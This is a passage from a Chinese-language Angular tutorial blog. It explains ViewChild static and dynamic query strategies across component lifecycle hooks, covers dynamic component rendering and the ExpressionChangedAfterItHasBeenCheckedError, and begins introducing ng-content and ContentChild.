</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>以上代码运行后，控制台的输出结果：</p> <p><img src="/vuebloger/img/post/1584487495-58c8067ab6e82_fix732.png" alt=""></p> <h2 id="查询策略"><a href="#查询策略" class="header-anchor">#</a> 查询策略</h2> <p>我们先通过一个例子来总结各种情况的使用：假设页面上的某些元素需要动态的添加和删除，显示的内容在页面上有一个数据源，其它元素需要根据这个数据源显示正确的数据，不管是动态组件还是普通组件。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;label for=&quot;box&quot;&gt;
      AppCompnent: 
      &lt;input type=&quot;checkbox&quot; [(ngModel)]=&quot;checked&quot; id=&quot;box&quot;&gt;
    &lt;/label&gt;

    &lt;hello [showGreeting]=&quot;checked&quot;&gt;&lt;/hello&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">p {
    font-family: Lato;
  }</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  checked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>app.component.ts 在这个组件里设置了一个checkbox，根据它的值决定是否在hello组件中显示问候语。hello.component.ts 主要需要实现的组件。除了destory外的所有组件生命周期的钩子函数在这里都实现了，在每个钩子函数运行时，我们都会打印当前组件内的所有查询结果，true表示可用，false不可用。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// hello.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;h2 #title&gt;&lt;/h2&gt;
  &lt;h4 *ngIf=&quot;showGreeting&quot;&gt;&lt;i #greeting&gt;&lt;/i&gt;&lt;/h4&gt;
  &lt;app-input&gt;
  &lt;div class=&quot;dynamic&quot;&gt;
    DynamicComponent: 
    &lt;ng-template #container&gt;&lt;/ng-template&gt;
  &lt;div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   h4 { font-family: Lato; } 
  :host {display: block;border: 1px dashed #333; padding: 1em; margin-top: 1em;}
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">HelloComponent</span> <span class="token punctuation">{</span>
  @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> showGreeting <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token keyword">static</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> title<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'greeting'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token keyword">static</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> greeting<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span>InputComponent<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token keyword">static</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> appInput<span class="token operator">:</span> InputComponent<span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">'container'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> read<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">,</span> <span class="token keyword">static</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> container<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">;</span>
  <span class="token keyword">private</span> logger<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 日志</span>
  <span class="token keyword">private</span> dynamicRef<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>DynamicComponent<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
    <span class="token parameter"><span class="token keyword">private</span> cfr<span class="token operator">:</span> ComponentFactoryResolver<span class="token punctuation">,</span></span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token comment">// 日志函数</span>
  <span class="token function">log</span><span class="token punctuation">(</span>phash<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token punctuation">{</span>
      phash<span class="token punctuation">,</span>
      title<span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>title<span class="token punctuation">,</span>
      greeting<span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>greeting<span class="token punctuation">,</span>
      container<span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">,</span>
      input<span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>appInput
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>logger<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>logger<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnChanges</span><span class="token punctuation">(</span><span class="token parameter">change<span class="token operator">:</span> SimpleChanges</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'OnChange'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'OnInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngDoCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'DoCheck'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngAfterContentInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'AfterContentInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngAfterContentChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'AfterContentChecked'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'AfterViewInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngAfterViewChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'AfterViewChecked'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 动态组件的渲染函数</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> componentFactory<span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span>DynamicComponent<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cfr<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>DynamicComponent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> componentRef <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span>componentFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
    componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicRef <span class="token operator">=</span> componentRef<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// input.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-input'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;label for=&quot;input&quot;&gt;
      InputComponent: 
      &lt;input id=&quot;input&quot; type=&quot;text&quot; name=&quot;name&quot; [(ngModel)]=&quot;value&quot;&gt;
    &lt;/label&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">h1 { font-family: Lato; }</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">InputComponent</span> <span class="token punctuation">{</span>
  value <span class="token operator">=</span> <span class="token string">&quot;typescript&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// dynamic.component.ts</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-dynamic'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h3&gt;Hi {{value}}&lt;/h3&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">h3 { font-family: Lato; color: green; display: inline-block; }</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DynamicComponent</span>  <span class="token punctuation">{</span>
  value <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br></div></div><p>接下来通过调整HelloComponent的代码，配合log先了解一下在不同情形，不同查询策略下所获取到的结果。</p> <h3 id="测试分析"><a href="#测试分析" class="header-anchor">#</a> 测试分析</h3> <p>以下标题中所指的true或false完整表述应该是 static:true/false。</p> <ol><li>全部false(官方建议大多数情况下应该设置 static: false)</li></ol> <p><img src="/vuebloger/img/post/v2-d7c01685b1d0f5e0776296e3591605ef_720w.png" alt=""></p> <p>AfterViewInit之后才能获取到结果。
2. title 的策略改为 true(这个查询不依赖于代码的运行时，属于‘静态’类型)</p> <p><img src="/vuebloger/img/post/v2-eda9d7da867b815c922e6673ee8585cc_720w.png" alt=""></p> <p>可以看到都不用等到OnInit阶段，在OnChange时就已经可以获取到结果了。那么我们可以在这些阶段给它赋值，比如</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>title<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Hello'</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'OnInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="3"><li>greeting 的策略改为 true(这个查询被嵌套在ngIf中，依赖于代码的运行时)</li></ol> <p><img src="/vuebloger/img/post/v2-f91fa07052b5dca3732f9a95decba359_720w.png" alt=""></p> <p>所有阶段都无法获取到，可以点击checkbox试下</p> <p><img src="/vuebloger/img/post/v2-2393c014ed9fbb940dafc4ff91f14c0e_720w.jpg" alt=""></p> <p>在8版本之前你可能感到困惑，但现在一清二楚：</p> <p><img src="/vuebloger/img/post/v2-773ad17c806e64be4dee5e8c02a09406_720w.png" alt=""></p> <p>如果要通过查询设置模板中标签的值，首先 static 的值应该设成false，然后在对应的钩子函数中设置它，比如 AfterViewInit 或 AfterViewChecked中添加。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>greeting<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Hello World'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="4"><li>appInput 的策略改为 true(这个查询主要是为了说明那些需要在父组件中从子组件获取值的情形)</li></ol> <p><img src="/vuebloger/img/post/v2-b4ad45ef7347ed25fcda8acae56c0020_720w.png" alt=""></p> <p>此时，可以把appInput的value赋值给title元素:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>title<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'OnInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="5"><li>container 的策略改为 true(这个组件是为了说明那些需要动态创建组件的情形)</li></ol> <p><img src="/vuebloger/img/post/v2-9f68abb3fc9d244435283934ed398614_720w.png" alt=""></p> <p>在OnInit的时候创建动态组件</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'OnInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>log里显示，所有阶段都可以正确获取到container，上面是把render放在了OnInit阶段，如果放在AfterViewInit阶段呢？</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'AfterViewInit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>报错了：</p> <p><img src="/vuebloger/img/post/v2-da804416eb142f7531f58aca258eb00b_720w.jpg" alt=""></p> <p>假如把 container 的查询策略重新改回 false，还是在 AfterViewInit 渲染，仍然会报上面的这个错误，官方解释：</p> <p><img src="/vuebloger/img/post/v2-01e279e3ccd9ab3b3d292cfd4f84e79f_720w.png" alt=""></p> <p>站在编译器的角度这话是视图刚初始化完成不可以又变。</p> <p>所以这种情况下，只能使用 static:true 策略，然后在view初始化完成前的钩子函数中创建动态组件，一般情况下首选OnInit。</p> <h3 id="设置合适策略"><a href="#设置合适策略" class="header-anchor">#</a> 设置合适策略</h3> <p>最后使用合适的策略来完成需求：</p> <ul><li>根据checkbox的值动态的显示问候语，也就是greeting。</li> <li>input的值发生变化后其它组件的值也相应的变化。</li></ul> <p>分析如下：</p> <ol><li><p>greeting只能设置false，同时要让它动态的根据InputCopmonent的值发生改变，如果在AfterViewInit中设置，则只能同步到初始状态的值，因为AfterViewInit只会发生一次，所以把它推后到AfterViewChecked阶段赋值。另外由于它依赖于程序运行时showGreeting的值，因此还需要进行一下判断。</p></li> <li><p>title采用官方的建议就用false，也把它放在AfterViewChecked阶段，理由同greeting。</p></li> <li><p>container只能设置true。</p></li> <li><p>appInput也设置为true，因为需要在render中访问它的值，而render是在OnInit阶段就调用了。</p></li> <li><p>动态组件的值要随appInut发生变化，需要对它重新赋值。如果赋值发生在AfterViewInit之后，势必会报ExpressionChangedAfterItHasBeenCheckedError，如果赋值写在OnChanges阶段，那么仅能在checkbox的值变化时才更新，这里最合适的是DoCheck阶段。</p></li></ol> <p>根据上面的分析添加如下代码：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">ngDoCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'DoCheck'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">ngAfterViewChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>greeting<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>greeting<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Hello '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>title<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>appInput<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'AfterViewChecked'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><img src="/vuebloger/img/post/v2-304d1f65f1bafc9bf54bd89e14e3e32e_b.gif" alt=""></p> <h2 id="contentchild-contentchildren"><a href="#contentchild-contentchildren" class="header-anchor">#</a> ContentChild/ContentChildren</h2> <p>熟悉 Angular 1.x 的用户，应该都知道 ng-transclude 指令，在 Angular 2以上 中引入新的 ng-content 指令。ng-content 指令支持 select 属性，它允许我们设定抽取的内容，更强大的是它支持我们常用的选择器类型，如标签选择器、类选择器、ID选择器、属性选择器等。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// greet.component.ts - template</span>
<span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;border: 1px solid #666;margin: 4px;&quot;</span><span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;border: 1px solid red;margin: 5px;&quot;</span><span class="token operator">&gt;</span>
         <span class="token operator">&lt;</span>ng<span class="token operator">-</span>content select<span class="token operator">=</span><span class="token string">&quot;header&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;border: 1px solid green;margin: 5px;&quot;</span><span class="token operator">&gt;</span>
         <span class="token operator">&lt;</span>ng<span class="token operator">-</span>content select<span class="token operator">=</span><span class="token string">&quot;.card_body&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;border: 1px solid blue;margin: 5px;&quot;</span><span class="token operator">&gt;</span>
         <span class="token operator">&lt;</span>ng<span class="token operator">-</span>content select<span class="token operator">=</span><span class="token string">&quot;footer&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span>
     <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4&gt;Welcome to Angular World&lt;/h4&gt;
    &lt;exe-greet&gt;
      &lt;header&gt;Card Header&lt;/header&gt;
          &lt;div class=&quot;card_body&quot;&gt;Card Body&lt;/div&gt;
      &lt;footer&gt;Card Footer&lt;/footer&gt;
    &lt;/exe-greet&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><blockquote><p>@ContentChild</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// child.component.ts</span>
